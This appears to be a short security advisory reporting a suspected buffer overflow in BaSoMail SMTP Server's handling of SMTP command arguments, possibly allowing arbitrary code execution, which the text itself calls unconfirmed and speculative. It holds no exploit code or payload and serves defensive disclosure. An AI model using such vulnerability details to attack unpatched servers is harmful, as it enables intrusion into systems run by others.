BaSoMail SMTP Server has been reported prone to a buffer overflow vulnerability.

The issue is likely due to a lack of sufficient bounds checking performed on arguments passed to SMTP commands.

Although unconfirmed and speculative, due to the nature of this vulnerability, it may be possible to exploit this issue to execute arbitrary attacker supplied code.
